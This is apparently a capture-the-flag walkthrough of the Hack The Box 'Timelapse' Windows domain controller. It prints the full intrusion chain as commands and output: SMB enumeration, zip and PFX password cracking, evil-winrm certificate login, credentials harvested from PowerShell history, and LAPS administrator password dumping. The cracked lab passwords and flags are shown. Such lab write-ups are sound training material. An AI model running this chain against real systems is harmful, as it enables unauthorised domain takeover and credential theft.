## 概要

## Search
### nmap
- command  
`sudo nmap -sC -sV -T4 10.10.11.152`
- result

<details><summary>summary</summary>
  
<pre>
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -T4 10.10.11.152
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-30 22:33 EDT
Nmap scan report for 10.10.11.152
Host is up (0.30s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2023-07-01 10:34:13Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
3268/tcp open  ldap
3269/tcp open  globalcatLDAPssl?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h59m57s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-07-01T10:34:50
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 121.73 seconds
</pre>

</details>

### smbmap
- command
  - -H target
  - -u user_name  
  `smbmap -H 10.10.11.152 -u anonymous`
- result

<details><summary>summary</summary>
<pre>
┌──(kali㉿kali)-[~]
└─$ smbmap -H 10.10.11.152 -u anonymous           
[+] Guest session       IP: 10.10.11.152:445    Name: 10.10.11.152                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        <span style="color:red">Shares                                                  READ ONLY</span>
        SYSVOL                                                  NO ACCESS       Logon server share 

</pre>
</details>

### smbclient
- command
  - -N no-pass
  `smbclient -N \\\\10.10.11.152\\Shares`
- result

<details><summary>summary</summary>

<pre>

┌──(kali㉿kali)-[~]
└─$ smbclient -N \\\\10.10.11.152\\Shares         
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Oct 25 11:39:15 2021
  ..                                  D        0  Mon Oct 25 11:39:15 2021
  Dev                                 D        0  Mon Oct 25 15:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 11:48:42 2021
c
                6367231 blocks of size 4096. 1258944 blocks available
smb: \> cd HelpDesk\
smb: \HelpDesk\> dir
  .                                   D        0  Mon Oct 25 11:48:42 2021
  ..                                  D        0  Mon Oct 25 11:48:42 2021
  LAPS.x64.msi                        A  1118208  Mon Oct 25 10:57:50 2021
  LAPS_Datasheet.docx                 A   104422  Mon Oct 25 10:57:46 2021
  LAPS_OperationsGuide.docx           A   641378  Mon Oct 25 10:57:40 2021
  LAPS_TechnicalSpecification.docx      A    72683  Mon Oct 25 10:57:44 2021

                6367231 blocks of size 4096. 1258072 blocks available
smb: \HelpDesk\> get LAPS_Datasheet.docx
getting file \HelpDesk\LAPS_Datasheet.docx of size 104422 as LAPS_Datasheet.docx (10.7 KiloBytes/sec) (average 10.7 KiloBytes/sec)
smb: \HelpDesk\> get LAPS_OperationsGuide.docx
getting file \HelpDesk\LAPS_OperationsGuide.docx of size 641378 as LAPS_OperationsGuide.docx (69.0 KiloBytes/sec) (average 39.1 KiloBytes/sec)
smb: \HelpDesk\> get LAPS_TechnicalSpecification.docx
getting file \HelpDesk\LAPS_TechnicalSpecification.docx of size 72683 as LAPS_TechnicalSpecification.docx (50.1 KiloBytes/sec) (average 39.8 KiloBytes/sec)
smb: \HelpDesk\> cd ../
smb: \> dir
  .                                   D        0  Mon Oct 25 11:39:15 2021
  ..                                  D        0  Mon Oct 25 11:39:15 2021
  Dev                                 D        0  Mon Oct 25 15:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 11:48:42 2021

                6367231 blocks of size 4096. 1230207 blocks available
smb: \> cd Dev
smb: \Dev\> dir
  .                                   D        0  Mon Oct 25 15:40:06 2021
  ..                                  D        0  Mon Oct 25 15:40:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 11:46:42 2021

                6367231 blocks of size 4096. 1229718 blocks available
smb: \Dev\> get winrm_backup.zip 
getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (1.4 KiloBytes/sec) (average 36.6 KiloBytes/sec)
smb: \Dev\> SMBecho failed (NT_STATUS_CONNECTION_RESET). The connection is disconnected now


</pre>

</details>

### zip2john.
- command  
`zip2john ./winrm_backup.zip > zip.hashes`  
`sudo gunzip /usr/share/wordlists/rockyou.txt.gz`  
`john ./zip.hashes --wordlist=/usr/share/wordlists/rockyou.txt`  

- result

<details><summary>summary</summary>

<pre>

┌──(kali㉿kali)-[~/HTB_dir]
└─$ john ./zip.hashes --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     
1g 0:00:00:14 DONE (2023-06-30 22:51) 0.06756g/s 234412p/s 234412c/s 234412C/s surkerior..suppamas
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

┌──(kali㉿kali)-[~/HTB_dir]
└─$ unzip winrm_backup.zip                                   
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: supremelegacy
  inflating: legacyy_dev_auth.pfx    
                                                                                                                                     
┌──(kali㉿kali)-[~/HTB_dir]
└─$ ls
LAPS_Datasheet.docx  LAPS_OperationsGuide.docx  LAPS_TechnicalSpecification.docx  legacyy_dev_auth.pfx  winrm_backup.zip  zip.hashes
                                                                                                                                     
┌──(kali㉿kali)-[~/HTB_dir]
└─$
</pre>

</details>

### CRACK AND READ .PFX FILE
- command
  - pkcs12
    - use .pfx   
`openssl pkcs12 -info -in ./legacyy_dev_auth.pfx`

- result

<details><summary>summary</summary>

<pre>

┌──(kali㉿kali)-[~/HTB_dir]
└─$ openssl pkcs12 -info -in ./legacyy_dev_auth.pfx
Enter Import Password:
MAC: sha1, Iteration 2000
MAC length: 20, salt length: 20
Mac verify error: invalid password?

┌──(kali㉿kali)-[~/Documents]
└─$ git clone https://github.com/crackpkcs12/crackpkcs12.git
Cloning into 'crackpkcs12'...
remote: Enumerating objects: 93, done.
remote: Total 93 (delta 0), reused 0 (delta 0), pack-reused 93
Receiving objects: 100% (93/93), 198.94 KiB | 2.12 MiB/s, done.
Resolving deltas: 100% (37/37), done.

┌──(kali㉿kali)-[~/Documents/crackpkcs12]
└─$ sudo apt install pkg-config         
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done


┌──(kali㉿kali)-[~/Documents/crackpkcs12]
└─$ sudo apt install libssl-dev 
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done

                                                                                                                                     
┌──(kali㉿kali)-[~/Documents/crackpkcs12]
└─$ ./configure                
checking for a BSD-compatible install... /usr/bin/install -c
checking whether build environment is sane... yes
checking for a thread-safe mkdir -p... /usr/bin/mkdir -p
checking for gawk... gawk
checking whether make sets $(MAKE)... yes
checking for gcc... gcc
checking whether the C compiler works... yes
checking for C compiler default output file name... a.out
checking for suffix of executables... 
checking whether we are cross compiling... no
checking for suffix of object files... o
checking whether we are using the GNU C compiler... yes
checking whether gcc accepts -g... yes
checking for gcc option to accept ISO C89... none needed
checking for style of include used by make... GNU
checking dependency style of gcc... gcc3
configure: creating ./config.status
config.status: creating Makefile
config.status: creating src/Makefile
config.status: executing depfiles commands
checking for pkg-config... /usr/bin/pkg-config
checking pkg-config is at least version 0.9.0... yes
checking for DEPS... yes
                                                                                                                                     
┌──(kali㉿kali)-[~/Documents/crackpkcs12]
└─$ make                       
Making all in src
make[1]: Entering directory '/home/kali/Documents/crackpkcs12/src'
gcc -DPACKAGE_NAME=\"\" -DPACKAGE_TARNAME=\"\" -DPACKAGE_VERSION=\"\" -DPACKAGE_STRING=\"\" -DPACKAGE_BUGREPORT=\"\" -DPACKAGE_URL=\"\" -I.     -g -O2 -MT crackpkcs12.o -MD -MP -MF .deps/crackpkcs12.Tpo -c -o crackpkcs12.o crackpkcs12.c
mv -f .deps/crackpkcs12.Tpo .deps/crackpkcs12.Po
gcc  -g -O2   -o crackpkcs12 crackpkcs12.o -lpthread -lcrypto 
make[1]: Leaving directory '/home/kali/Documents/crackpkcs12/src'
make[1]: Entering directory '/home/kali/Documents/crackpkcs12'
make[1]: Nothing to be done for 'all-am'.
make[1]: Leaving directory '/home/kali/Documents/crackpkcs12'
                                                                                                                                     
┌──(kali㉿kali)-[~/Documents/crackpkcs12]
└─$ sudo make install          
Making install in src
make[1]: Entering directory '/home/kali/Documents/crackpkcs12/src'
make[2]: Entering directory '/home/kali/Documents/crackpkcs12/src'
 /usr/bin/mkdir -p '/usr/local/bin'
  /usr/bin/install -c crackpkcs12 '/usr/local/bin'
make[2]: Nothing to be done for 'install-data-am'.
make[2]: Leaving directory '/home/kali/Documents/crackpkcs12/src'
make[1]: Leaving directory '/home/kali/Documents/crackpkcs12/src'
make[1]: Entering directory '/home/kali/Documents/crackpkcs12'
make[2]: Entering directory '/home/kali/Documents/crackpkcs12'
make[2]: Nothing to be done for 'install-exec-am'.
make[2]: Nothing to be done for 'install-data-am'.
make[2]: Leaving directory '/home/kali/Documents/crackpkcs12'
make[1]: Leaving directory '/home/kali/Documents/crackpkcs12'
                                                                                                                                     
</pre>

</details>

### crackpkcs12
- command
`crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./legacyy_dev_auth.pfx`

- result

<details><summary>summary</summary>

<pre>

┌──(kali㉿kali)-[~/HTB_dir]
└─$ crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./legacyy_dev_auth.pfx

Dictionary attack - Starting 2 threads

*********************************************************
Dictionary attack - Thread 1 - Password found: thuglegacy
*********************************************************


┌──(kali㉿kali)-[~/HTB_dir]
└─$ openssl pkcs12 -in ./legacyy_dev_auth.pfx -nocerts -out private.pem -nodes 
Enter Import Password:
                                                                                                                                     
┌──(kali㉿kali)-[~/HTB_dir]
└─$ ls
LAPS_Datasheet.docx        LAPS_TechnicalSpecification.docx  private.pem       zip.hashes
LAPS_OperationsGuide.docx  legacyy_dev_auth.pfx              winrm_backup.zip
                                                                                                                                     
┌──(kali㉿kali)-[~/HTB_dir]
└─$ openssl pkcs12 -in ./legacyy_dev_auth.pfx -out public.pem -clcerts -nokeys
Enter Import Password:
                                                                                                                                     
┌──(kali㉿kali)-[~/HTB_dir]
└─$ ls
LAPS_Datasheet.docx        LAPS_TechnicalSpecification.docx  private.pem  winrm_backup.zip
LAPS_OperationsGuide.docx  legacyy_dev_auth.pfx              public.pem   zip.hashes

</pre>

</details>

## Initial Access
### evil-winrm
- command
`evil-winrm -i 10.10.11.152 -c public.pem -k private.pem -S`

- result

<details><summary>summary</summary>

<pre>

┌──(kali㉿kali)-[~/HTB_dir]
└─$ evil-winrm -i 10.10.11.152 -c public.pem -k private.pem -S
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                                                   
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\legacyy\Documents> dir
*Evil-WinRM* PS C:\Users\legacyy\Documents> cd ../
*Evil-WinRM* PS C:\Users\legacyy> dir


    Directory: C:\Users\legacyy


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---       10/25/2021   8:25 AM                Desktop
d-r---       10/25/2021   8:22 AM                Documents
d-r---        9/15/2018  12:19 AM                Downloads
d-r---        9/15/2018  12:19 AM                Favorites
d-r---        9/15/2018  12:19 AM                Links
d-r---        9/15/2018  12:19 AM                Music
d-r---        9/15/2018  12:19 AM                Pictures
d-----        9/15/2018  12:19 AM                Saved Games
d-r---        9/15/2018  12:19 AM                Videos


*Evil-WinRM* PS C:\Users\legacyy> cd Desktop
*Evil-WinRM* PS C:\Users\legacyy\Desktop> dir


    Directory: C:\Users\legacyy\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         7/1/2023   3:16 AM             34 user.txt


*Evil-WinRM* PS C:\Users\legacyy\Desktop> type user.txt
e93896b45e77c0069ff4960135d4d221
*Evil-WinRM* PS C:\Users\legacyy\Desktop> net users

User accounts for \\

-------------------------------------------------------------------------------
Administrator            babywyrm                 Guest
krbtgt                   legacyy                  payl0ad
sinfulz                  svc_deploy               thecybergeek
TRX
The command completed with one or more errors.

*Evil-WinRM* PS C:\Users\legacyy\Desktop> net users /domain

User accounts for \\

-------------------------------------------------------------------------------
Administrator            babywyrm                 Guest
krbtgt                   legacyy                  payl0ad
sinfulz                  svc_deploy               thecybergeek
TRX
The command completed with one or more errors.

*Evil-WinRM* PS C:\Users\legacyy\Desktop> net users svc_deploy
User name                    svc_deploy
Full Name                    svc_deploy
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/25/2021 12:12:37 PM
Password expires             Never
Password changeable          10/26/2021 12:12:37 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   10/25/2021 12:25:53 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users
The command completed successfully.


</pre>

</details>

### powershell command history
- file path
`C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`

- result

<details><summary>summary</summary>

<pre>

*Evil-WinRM* PS C:\Users\legacyy\Desktop> type C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
*Evil-WinRM* PS C:\Users\legacyy\Desktop> 

</pre>

</details>

### svc_deploy Initial Access
- command
`git clone https://github.com/kfosaaen/Get-LAPSPasswords.git`
`evil-winrm -i 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S -r timelapse -s /home/kali/Documents/Get-LAPSPasswords`

- result

<details><summary>summary</summary>

<pre>

┌──(kali㉿kali)-[~/HTB_dir]
└─$ evil-winrm -i 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S -r timelapse -s /home/kali/Documents/Get-LAPSPasswords
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                                                   
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Warning: User is not needed for Kerberos auth. Ticket will be used
                                        
Warning: Password is not needed for Kerberos auth. Ticket will be used
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Get-LAPSPasswords.ps1
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Get-LAPSPasswords


Hostname   : dc01.timelapse.htb
Stored     : 1
Readable   : 1
Password   : 2-[7;Yh%,-Q4%tTt9z8AH9Y@
Expiration : 7/6/2023 3:16:24 AM

Hostname   : dc01.timelapse.htb
Stored     : 1
Readable   : 1
Password   : 2-[7;Yh%,-Q4%tTt9z8AH9Y@
Expiration : 7/6/2023 3:16:24 AM

Hostname   :
Stored     : 0
Readable   : 0
Password   :
Expiration : NA

Hostname   : dc01.timelapse.htb
Stored     : 1
Readable   : 1
Password   : 2-[7;Yh%,-Q4%tTt9z8AH9Y@
Expiration : 7/6/2023 3:16:24 AM

Hostname   :
Stored     : 0
Readable   : 0
Password   :
Expiration : NA

Hostname   :
Stored     : 0
Readable   : 0
Password   :
Expiration : NA

Hostname   : dc01.timelapse.htb
Stored     : 1
Readable   : 1
Password   : 2-[7;Yh%,-Q4%tTt9z8AH9Y@
Expiration : 7/6/2023 3:16:24 AM

Hostname   :
Stored     : 0
Readable   : 0
Password   :
Expiration : NA

Hostname   :
Stored     : 0
Readable   : 0
Password   :
Expiration : NA

Hostname   :
Stored     : 0
Readable   : 0
Password   :
Expiration : NA


</pre>

</details>

### administrator Initial Acess
- command
`evil-winrm -i 10.10.11.152 -u administrator -p '2-[7;Yh%,-Q4%tTt9z8AH9Y@' -S -r timelapse`

- result

<details><summary>summary</summary>

<pre>

┌──(kali㉿kali)-[~]
└─$ evil-winrm -i 10.10.11.152 -u administrator -p '2-[7;Yh%,-Q4%tTt9z8AH9Y@' -S -r timelapse
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                                                   
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Warning: User is not needed for Kerberos auth. Ticket will be used
                                        
Warning: Password is not needed for Kerberos auth. Ticket will be used
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> dir
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../
*Evil-WinRM* PS C:\Users\Administrator> ls


    Directory: C:\Users\Administrator


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---       10/23/2021  11:27 AM                3D Objects
d-r---       10/23/2021  11:27 AM                Contacts
d-r---         3/3/2022   7:48 PM                Desktop
d-r---       10/23/2021  12:22 PM                Documents
d-r---       10/25/2021   2:06 PM                Downloads
d-r---       10/23/2021  11:27 AM                Favorites
d-r---       10/23/2021  11:28 AM                Links
d-r---       10/23/2021  11:27 AM                Music
d-r---       10/23/2021  11:27 AM                Pictures
d-r---       10/23/2021  11:27 AM                Saved Games
d-r---       10/23/2021  11:27 AM                Searches
d-r---       10/23/2021  11:27 AM                Videos


*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cd C:\Users\TRX\Desktop

*Evil-WinRM* PS C:\Users\TRX\Desktop> 
*Evil-WinRM* PS C:\Users\TRX\Desktop> type root.txt

</pre>

</details>
